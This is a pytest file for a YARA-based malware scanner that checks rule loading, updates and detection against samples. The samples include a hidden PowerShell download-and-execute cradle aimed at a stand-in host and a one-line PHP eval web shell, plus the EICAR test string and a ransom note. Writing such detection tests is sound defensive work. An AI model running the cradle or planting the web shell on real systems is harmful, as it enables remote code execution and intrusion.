from __future__ import annotations

from pathlib import Path

import pytest

from centralium.agent.interfaces import YaraScanner
from centralium.agent.models import FindingSource, Severity
from centralium.agent.yara import YaraManager, yara_available

pytestmark = pytest.mark.skipif(not yara_available(), reason="yara-python missing")
RULES = Path(__file__).resolve().parents[2] / "rules" / "yara"
EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" + "!$H+H*"
GOOD = 'rule T_One { meta: severity = "low" family = "t" strings: $a = "needle-xyz" condition: $a }'


@pytest.fixture
def mgr(db) -> YaraManager:
    return YaraManager(db, RULES)


def test_protocol_and_shipped_rules(mgr: YaraManager) -> None:
    assert isinstance(mgr, YaraScanner)
    ids = {r.rule_id for r in mgr.list_rules()}
    assert {"CENT-YARA-0001", "CENT-YARA-0002", "CENT-YARA-0003", "CENT-YARA-0004"} <= ids
    assert mgr.reload() == mgr.active_rule_count() >= 4


def test_eicar_positive_known_malicious(mgr, make_event) -> None:
    f = mgr.scan_bytes(EICAR.encode(), make_event())
    assert len(f) == 1 and f[0].source == FindingSource.YARA and f[0].known_malicious
    assert f[0].rule_id == "YARA:CENT-YARA-0001" and f[0].score >= 90 and f[0].severity == Severity.HIGH


def test_negative_benign(mgr, make_event) -> None:
    assert mgr.scan_bytes(b"hello world, nothing to see\n" * 50, make_event()) == []
    assert mgr.scan_bytes(b"", make_event()) == []


def test_powershell_cradle_suspicious_not_known(mgr, make_event) -> None:
    txt = b"powershell -WindowStyle Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\""
    f = mgr.scan_bytes(txt, make_event())
    assert [x.rule_id for x in f] == ["YARA:CENT-YARA-0002"]
    assert not f[0].known_malicious and "T1059.001" in f[0].mitre_techniques


def test_ransom_note_and_webshell(mgr, make_event) -> None:
    note = b"Your files have been encrypted. Send bitcoin; visit our .onion site for the decryption key."
    assert [x.rule_id for x in mgr.scan_bytes(note, make_event())] == ["YARA:CENT-YARA-0003"]
    shell = b"<?php @eval($_POST['x']); ?>"
    assert [x.rule_id for x in mgr.scan_bytes(shell, make_event())] == ["YARA:CENT-YARA-0004"]
    assert mgr.scan_bytes(b"<?php echo 'hi'; ?>", make_event()) == []


def test_scan_file(mgr, make_event, tmp_path) -> None:
    p = tmp_path / "e.com"
    p.write_bytes(EICAR.encode())
    assert mgr.scan_file(p, make_event())[0].details["target"] == str(p)
    assert mgr.scan_file(tmp_path / "missing", make_event()) == []
    assert mgr.scan_file(tmp_path, make_event()) == []  # directory


def test_results_persisted(mgr, db, make_event) -> None:
    mgr.scan_bytes(EICAR.encode(), make_event())
    assert db.count("yara_results") == 1


def test_bad_rule_update_rejected_and_old_set_kept(mgr, make_event) -> None:
    before = mgr.active_rule_count()
    res = mgr.update_bundle("centralium_core", "rule Broken { condition: undefined_ident }")
    assert not res.ok and res.rules == before == mgr.active_rule_count()
    assert mgr.scan_bytes(EICAR.encode(), make_event())  # still detecting
    ok, msg = mgr.validate_rules("rule X { strings: $a = ")
    assert not ok and msg


def test_valid_update_activates_and_persists(db, make_event) -> None:
    m = YaraManager(db)
    assert m.active_rule_count() == 0 and m.scan_bytes(b"needle-xyz", make_event()) == []
    assert m.update_bundle("custom", GOOD, version="7", source="unit").ok
    f = m.scan_bytes(b"..needle-xyz..", make_event())
    assert f and f[0].details["version"] == "7" and f[0].details["source"] == "unit"
    # reload in a new manager from the DB
    m2 = YaraManager(db)
    assert m2.active_rule_count() == 1 and m2.scan_bytes(b"needle-xyz", make_event())
    row = db.query_one("SELECT * FROM yara_rules WHERE rule_id = 'T_One'")
    assert row["family"] == "t" and row["severity"] == "low" and row["enabled"] == 1


def test_disable_rule(mgr, make_event) -> None:
    assert mgr.set_rule_enabled("CENT-YARA-0001", False)
    assert mgr.scan_bytes(EICAR.encode(), make_event()) == []
    assert mgr.set_rule_enabled("CENT-YARA-0001", True)
    assert mgr.scan_bytes(EICAR.encode(), make_event())
    assert not mgr.set_rule_enabled("nope", True)


def test_disable_persists_across_reload(db, make_event) -> None:
    m = YaraManager(db, RULES)
    m.set_rule_enabled("CENT-YARA-0001", False)
    m.reload()
    assert m.scan_bytes(EICAR.encode(), make_event()) == []


def test_duplicate_rule_id_across_bundles_rejected(db) -> None:
    m = YaraManager(db)
    assert m.update_bundle("a", GOOD).ok
    r = m.update_bundle("b", GOOD)
    assert not r.ok and "duplicate" in r.message


def test_invalid_severity_rejected(db) -> None:
    ok, msg = YaraManager(db).validate_rules('rule S { meta: severity = "apocalyptic" condition: true }')
    assert not ok and "severity" in msg


def test_directory_skips_invalid_files(db, tmp_path) -> None:
    (tmp_path / "good.yar").write_text(GOOD)
    (tmp_path / "bad.yar").write_text("rule {{{")
    m = YaraManager(db, tmp_path)
    assert m.active_rule_count() == 1
